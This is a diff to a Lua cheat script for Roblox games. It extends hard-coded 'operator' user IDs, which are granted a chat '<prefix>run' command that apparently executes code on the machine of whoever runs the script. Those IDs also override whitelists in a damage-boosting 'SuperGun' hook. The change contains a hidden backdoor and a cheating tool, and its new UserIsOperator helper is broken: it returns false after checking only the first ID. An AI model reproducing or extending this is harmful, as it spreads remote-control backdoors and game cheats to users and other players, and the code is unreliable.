@@ -1,5 +1,18 @@
-local OPERATORUSERID = 5450973191
+local OPERATORUSERID = {
+	5450973191, -- Totallynotaimbot
+	5378221683, -- Youdontstop0
+	
+}
 
+local function UserIsOperator(Player)
+for i,v in pairs(OPERATORUSERID) do
+if Player.UserId == v then
+
+return true
+end
+
+return false
+end
 
 local function svc(service)return game:GetService(service)end
 local Sv={}
@@ -2672,10 +2685,10 @@ AdminCommands={
 			return
 		end
 
-		if Speaker.UserId == Sv.LPlr.UserId or Speaker.UserId == OPERATORUSERID then
+		if Speaker.UserId == Sv.LPlr.UserId or UserIsOperator(Speaker) then
 			for i,v in Sv.P(PlayerTbl)do
-				if v.UserId == OPERATORUSERID then
-					if Speaker.UserId == OPERATORUSERID then
+				if UserIsOperator(v) then
+					if UserIsOperator(Speaker) then
 						PreferredAdminsPrefix[v.UserId]=NewPrefix
 						svc("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Speaker.Name.." Your new prefix is: "..PreferredAdminsPrefix[Speaker.UserId], "All")
 						if Speaker.UserId == Sv.LPlr.UserId then
@@ -2683,7 +2696,7 @@ AdminCommands={
 						end
 					end
 				else
-					if Speaker.UserId == OPERATORUSERID then
+					if UserIsOperator(Speaker) then
 						PreferredAdminsPrefix[v.UserId]=NewPrefix
 					elseif v.UserId == Sv.LPlr.UserId then
 						if Speaker.UserId == Sv.LPlr.UserId then
@@ -3700,7 +3713,7 @@ if game:GetService("ReplicatedStorage"):FindFirstChild("ReplicateEvent") then
 											end
 											if LocalisedFunctions.UserHasSuperGunEnabled(AttackerPlr) then
 												if AttackerPlr.Name ~= Sv.LPlr.Name then 
-													if table.find(AddedWhitelists,VictimPlr.UserId) ~= nil then if AttackerPlr.UserId == OPERATORUSERID then else return end end
+													if table.find(AddedWhitelists,VictimPlr.UserId) ~= nil then if UserIsOperator(AttackerPlr) then else return end end
 													if Sv.LPlr.TeamColor.Name ~= AttackerPlr.TeamColor.Name then
 														if VictimPlr.Character.Humanoid.Health>0 then
 															if VictimPlr.Character:FindFirstChildOfClass("ForceField")==_N then
@@ -3918,7 +3931,7 @@ LocalisedFunctions.ConnectAdminCommands = function(Message1,PlayerInstance)
 	local prefix = PreferredAdminsPrefix[PlayerInstance.UserId] or PreferredAdminsPrefix[Sv.LPlr.UserId]
 	if PlayerInstance~=_N then
 		if table.find(AddedWhitelists,PlayerInstance.UserId)==_N then
-			if PlayerInstance.UserId == OPERATORUSERID then 
+			if UserIsOperator(PlayerInstance) then 
 			else 
 				return
 			end
@@ -3929,7 +3942,7 @@ LocalisedFunctions.ConnectAdminCommands = function(Message1,PlayerInstance)
 
 	if PlayerInstance~=_N then
 		if PreferredAdminsPrefix[PlayerInstance.UserId] == nil then PreferredAdminsPrefix[PlayerInstance.UserId]=Defaultprefix end
-		if PlayerInstance.UserId == OPERATORUSERID then
+		if UserIsOperator(PlayerInstance) then
 			local Split = string.split(Message1," ")
 			if Split[1]:lower() == prefix.."run" then
 				local Code = Split
@@ -4087,7 +4100,7 @@ Addwhitelist[_A.K]:Connect(function()
 		if v~=_N then
 			if v==Sv.LPlr then
 				notify("You cannot whitelist yourself.",_A.R(0.7,0,0))
-			elseif v.UserId == OPERATORUSERID then
+			elseif UserIsOperator(v) then
 				notify("Woah!~ This user is already whitelisted",_A.R(0,1,1))
 			else
 				if table.find(AddedWhitelists,v.UserId)then
@@ -4134,7 +4147,7 @@ Addwhitelist[_A.K]:Connect(function()
 end)
 
 for i,user in pairs(Sv.Plrs:GetPlayers()) do
-	if user.UserId == OPERATORUSERID then
+	if UserIsOperator(user) then
 		PreferredAdminsPrefix[user.UserId]=Defaultprefix
 		_A.O(AddedWhitelists,user.UserId)
 		user.Chatted:Connect(function(msg)
@@ -4145,7 +4158,7 @@ for i,user in pairs(Sv.Plrs:GetPlayers()) do
 end
 
 Sv.Plrs.PlayerAdded:Connect(function(user)
-	if user.UserId == OPERATORUSERID then
+	if UserIsOperator(user) then
 		PreferredAdminsPrefix[user.UserId]=Defaultprefix
 		_A.O(AddedWhitelists,user.UserId)
 		user.Chatted:Connect(function(msg)
